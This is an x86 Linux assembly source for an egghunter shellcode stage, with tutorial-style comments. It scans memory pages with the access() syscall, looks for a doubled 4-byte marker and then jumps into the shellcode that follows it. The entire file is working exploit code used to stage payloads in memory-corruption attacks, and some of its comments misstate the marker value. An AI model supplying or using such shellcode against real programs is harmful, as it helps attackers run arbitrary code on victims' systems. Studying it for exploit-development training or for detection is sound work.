global _start

section .text
_start:
    mov esi, 0x33643063	; egg ("cd0e"), backwards in little endian = "3d0c" = 0x33643063
    xor ecx, ecx		
    mul ecx             ; set eax and edx to 0

page_forward:		    ; here, we're going to design a function of what to do if we get an EFAULT error
    or dx, 0xfff		; doing a bitwise logical OR against the $dx value
                        ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

address_check:		    ; here we're going to design a function to check the next 8 bytes of mem
    inc edx			    ; gets $edx to a nice multiple of 4096
    lea ebx, [edx+4]	; load [edx+4] to check if this fresh page is readable by us
    push 0x21		; access()
    pop eax
    int 0x80

    cmp al, 0xf2		; does the low-end of $eax equal 0xf2? did we get an EFAULT? 
    jz page_forward		; if we got an EFAULT, this page is unreadable, time to go to the next page!

    cmp [edx], esi		; is what is stored at the address of $edx our egg (0x65643063) ?
    jnz address_check	; if it's not, let's advance into the page and see if we can't find that pesky egg
    
    cmp [edx+4], esi	; we found our egg once, let's see if it's also in $edx + 4
    jnz address_check	; we found it once but not twice, have to keep looking
    
    add edx, 0x8        ; jump past our egg to our actual shellcode
    jmp edx			    ; we found it twice! go to edx (where our egg is) +8 and execute the code there! 
